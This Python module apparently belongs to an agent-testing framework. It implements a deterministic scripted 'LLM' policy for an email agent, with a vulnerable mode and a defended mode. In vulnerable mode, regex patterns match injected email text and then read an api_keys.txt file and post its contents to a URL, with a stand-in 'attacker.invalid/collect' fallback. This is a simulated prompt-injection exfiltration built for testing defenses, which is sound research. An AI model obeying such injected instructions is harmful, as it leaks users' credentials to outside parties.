"""A deterministic, message-driven policy used by the Phase 2 examples.

This is intentionally a small policy rather than a transcript player.  It
looks at the latest tool result and derives the next action from that result.
That distinction is what lets later replay and shrinking remove the poisoned
email while preserving the rest of the run.
"""

from __future__ import annotations

import json
import re
from collections.abc import Mapping, Sequence
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Literal

ActionKind = Literal["tool_call", "final_answer"]


@dataclass(frozen=True)
class Action:
    """One deterministic policy decision.

    ``tool`` and ``args`` are populated for a tool call; ``answer`` is
    populated for a final answer.  The small ``name``/``arguments`` aliases
    make the object convenient for callers that use OpenAI-style vocabulary.
    """

    kind: ActionKind
    tool: str | None = None
    args: dict[str, Any] | None = None
    answer: str | None = None

    @classmethod
    def tool_call(cls, tool: str, args: Mapping[str, Any] | None = None) -> Action:
        """Create a tool-call action."""

        return cls(kind="tool_call", tool=tool, args=dict(args or {}))

    @classmethod
    def final(cls, answer: str) -> Action:
        """Create a terminal answer action."""

        return cls(kind="final_answer", answer=answer)

    @property
    def name(self) -> str | None:
        """OpenAI-style alias for :attr:`tool`."""

        return self.tool

    @property
    def arguments(self) -> dict[str, Any]:
        """OpenAI-style alias for :attr:`args`."""

        return dict(self.args or {})


DEFAULT_RESPONSES: dict[str, Any] = {
    "injection_patterns": [
        {
            "pattern": (
                r"read\s+(?:the\s+)?contents?\s+of\s+[`\"']?"
                r"([\w./-]*api[_-]?keys\.txt)[`\"']?"
            ),
            "tool": "read_file",
            "args": {"path": "{1}"},
        },
        {
            "pattern": (
                r"read\s+(?:the\s+)?(?:file\s+)?[`\"']?"
                r"([\w./-]*api[_-]?keys\.txt)[`\"']?"
            ),
            "tool": "read_file",
            "args": {"path": "{1}"},
        },
        {
            "pattern": r"(?:post|send|forward).{0,160}(https?://[^\s'\"`)>]+)",
            "tool": "send_http",
            "args": {"url": "{1}", "body": "{last_tool_result}"},
        },
    ],
    "task_plan": {"first_tool": "list_emails"},
}


def _merge_config(base: dict[str, Any], override: Mapping[str, Any]) -> dict[str, Any]:
    """Merge the two shallow configuration sections used by the policy."""

    merged = dict(base)
    for key, value in override.items():
        if isinstance(value, Mapping) and isinstance(merged.get(key), Mapping):
            merged[key] = {**merged[key], **value}
        else:
            merged[key] = value
    return merged


def _content_text(content: Any) -> str:
    """Convert a tool result to stable searchable text."""

    if isinstance(content, str):
        return content
    if isinstance(content, Mapping):
        return json.dumps(content, ensure_ascii=False, sort_keys=True)
    if isinstance(content, Sequence) and not isinstance(content, bytes | bytearray):
        return json.dumps(content, ensure_ascii=False, sort_keys=True, default=str)
    return str(content)


def _tool_results(messages: Sequence[Mapping[str, Any]]) -> list[Mapping[str, Any]]:
    """Return tool-result messages, accepting both common role spellings."""

    return [
        message
        for message in messages
        if message.get("role") in {"tool", "tool_result"}
        or message.get("type") == "tool_result"
    ]


def _called_tools(
    messages: Sequence[Mapping[str, Any]],
) -> list[tuple[str, dict[str, Any]]]:
    """Extract the policy's prior tool calls from assistant messages."""

    calls: list[tuple[str, dict[str, Any]]] = []
    for message in messages:
        if message.get("role") != "assistant":
            continue
        call = message.get("tool_call")
        if isinstance(call, Mapping):
            name = call.get("name") or call.get("tool")
            args = call.get("arguments") or call.get("args") or {}
            if isinstance(name, str) and isinstance(args, Mapping):
                calls.append((name, dict(args)))
        for call in message.get("tool_calls", []) or []:
            if isinstance(call, Mapping):
                function = call.get("function", call)
                if isinstance(function, Mapping):
                    name = function.get("name") or function.get("tool")
                    raw_args = function.get("arguments") or function.get("args") or {}
                    if isinstance(raw_args, str):
                        try:
                            raw_args = json.loads(raw_args)
                        except json.JSONDecodeError:
                            raw_args = {}
                    if isinstance(name, str) and isinstance(raw_args, Mapping):
                        calls.append((name, dict(raw_args)))
    return calls


def _extract_records(content: Any, key: str) -> list[dict[str, Any]]:
    """Extract list-like records from a world tool response."""

    value = content
    if isinstance(content, str):
        try:
            value = json.loads(content)
        except json.JSONDecodeError:
            return []
    if isinstance(value, Mapping):
        value = value.get(key, value.get("items", value.get("results", [])))
    if not isinstance(value, Sequence) or isinstance(value, str | bytes | bytearray):
        return []
    records: list[dict[str, Any]] = []
    for item in value:
        if isinstance(item, Mapping):
            records.append(dict(item))
        elif isinstance(item, str | int):
            records.append({"id": item})
    return records


class ScriptedLLM:
    """Deterministic rule-based policy with optional injection defense.

    ``responses_path`` may point at a JSON object containing
    ``injection_patterns`` and ``task_plan``.  A pattern can be a string or an
    object with ``pattern``/``regex`` and ``tool``/``action`` fields.  Action
    arguments support ``{1}`` capture references, ``{last_tool_result}``, and
    ``{last_file_result}``.
    """

    def __init__(
        self,
        responses_path: str | Path | None = None,
        *,
        defended: bool = False,
        config: Mapping[str, Any] | None = None,
    ) -> None:
        """Create a policy from JSON configuration or the example defaults."""

        loaded: dict[str, Any] = {}
        path = Path(responses_path) if responses_path is not None else None
        if path is None:
            path = (
                Path(__file__).resolve().parents[2]
                / "examples"
                / "leaky_agent"
                / "scripted_responses.json"
            )
        if path.is_file():
            try:
                decoded = json.loads(path.read_text(encoding="utf-8"))
            except (OSError, json.JSONDecodeError):
                decoded = {}
            if isinstance(decoded, Mapping):
                loaded = dict(decoded)
        if config is not None:
            loaded = _merge_config(loaded, config)
        self.config = _merge_config(DEFAULT_RESPONSES, loaded)
        self.defended = defended

    def next_action(
        self,
        messages: Sequence[Mapping[str, Any]],
        tools: Sequence[Mapping[str, Any]] | Mapping[str, Any],
    ) -> Action:
        """Choose the next action from the current conversation state.

        Tool-result instructions are deliberately ignored in defended mode;
        they are data, not policy.  In vulnerable mode only the latest result
        is considered, preventing an old poisoned message from being replayed.
        """

        del tools  # The policy only emits names from its configured contract.
        results = _tool_results(messages)
        calls = _called_tools(messages)
        latest = results[-1] if results else None
        latest_text = _content_text(latest.get("content")) if latest else ""
        source_name = latest.get("name") if latest is not None else None
        if (
            latest is not None
            and not self.defended
            and source_name in {None, "read_email"}
        ):
            for pattern in self.config.get("injection_patterns", []):
                action = self._injection_action(pattern, latest_text)
                if action is not None:
                    return action

        if not calls:
            first_tool = self.config.get("task_plan", {}).get(
                "first_tool", "list_emails"
            )
            if isinstance(first_tool, str):
                return Action.tool_call(first_tool)
            return Action.tool_call("list_emails")

        last_tool, last_args = calls[-1]
        if last_tool == "read_file":
            file_result = latest_text
            url = self._last_injection_url(messages)
            return Action.tool_call("send_http", {"url": url, "body": file_result})
        if last_tool == "send_http":
            return self._next_email_action(messages)
        if last_tool == "list_emails":
            return self._next_email_action(messages, first=True)
        if last_tool == "read_email":
            return self._next_email_action(messages)
        if last_tool in {"list_files", "read_file"}:
            return self._next_email_action(messages)
        if latest is not None and last_args:
            return self._next_email_action(messages)
        return Action.final(
            "I reviewed the available messages and found nothing else requiring action."
        )

    def _injection_action(self, pattern: Any, text: str) -> Action | None:
        if isinstance(pattern, str):
            parts = pattern.split(maxsplit=1)
            if len(parts) == 2 and parts[0] in {
                "read_file",
                "send_http",
            }:
                tool, target = parts
                expression = re.escape(target)
                string_args: dict[str, str]
                if tool == "read_file":
                    string_args = {"path": target}
                else:
                    string_args = {"url": target, "body": "{last_tool_result}"}
                action_spec = {"tool": tool, "args": string_args}
            else:
                expression = pattern
                action_spec = None
        elif isinstance(pattern, Mapping):
            expression = pattern.get(
                "pattern", pattern.get("regex", pattern.get("match", ""))
            )
            action_spec = pattern.get("action", pattern)
        else:
            return None
        if not isinstance(expression, str) or not expression:
            return None
        try:
            match = re.search(expression, text, flags=re.IGNORECASE | re.DOTALL)
        except re.error:
            match = re.search(re.escape(expression), text, flags=re.IGNORECASE)
        if match is None:
            return None
        if action_spec is None:
            return None
        if isinstance(action_spec, Mapping) and "actions" in action_spec:
            actions = action_spec.get("actions")
            action_spec = (
                actions[0] if isinstance(actions, Sequence) and actions else None
            )
        if isinstance(action_spec, str):
            raw_tool: Any = action_spec
            rendered_args: Mapping[str, Any] = {}
        elif isinstance(action_spec, Mapping):
            raw_tool = action_spec.get("tool", action_spec.get("name"))
            raw_args = action_spec.get("args", action_spec.get("arguments", {}))
            rendered_args = raw_args if isinstance(raw_args, Mapping) else {}
        else:
            return None
        if not isinstance(raw_tool, str):
            return None
        tool = raw_tool
        values = {
            str(index): value for index, value in enumerate(match.groups(), start=1)
        }
        values["match"] = match.group(0)
        values["last_tool_result"] = text
        values["last_file_result"] = text
        return Action.tool_call(tool, self._render_args(rendered_args, values))

    def _render_args(
        self, args: Mapping[str, Any], values: Mapping[str, str]
    ) -> dict[str, Any]:
        rendered: dict[str, Any] = {}
        for key, value in args.items():
            if isinstance(value, str):
                rendered[key] = re.sub(
                    r"\{([^{}]+)\}",
                    lambda match: values.get(match.group(1), match.group(0)),
                    value,
                )
            else:
                rendered[key] = value
        return rendered

    def _last_injection_url(self, messages: Sequence[Mapping[str, Any]]) -> str:
        text = "\n".join(
            _content_text(message.get("content")) for message in _tool_results(messages)
        )
        match = re.search(r"https?://[^\s'\"`)>]+", text, flags=re.IGNORECASE)
        return match.group(0) if match else "https://attacker.invalid/collect"

    def _next_email_action(
        self,
        messages: Sequence[Mapping[str, Any]],
        *,
        first: bool = False,
    ) -> Action:
        calls = _called_tools(messages)
        listed: list[dict[str, Any]] = []
        for message in reversed(_tool_results(messages)):
            if any(name == "list_emails" for name, _ in calls):
                listed = _extract_records(message.get("content"), "emails")
                if listed:
                    break
        read_ids = {
            str(args.get("id"))
            for name, args in calls
            if name == "read_email" and args.get("id") is not None
        }
        for record in listed:
            identifier = record.get("id", record.get("email_id"))
            if identifier is not None and (first or str(identifier) not in read_ids):
                return Action.tool_call("read_email", {"id": identifier})
        if first and not listed:
            return Action.tool_call("read_email", {"id": 0})
        return Action.final(
            "I reviewed the available messages and found nothing else requiring action."
        )


__all__ = ["Action", "ScriptedLLM"]
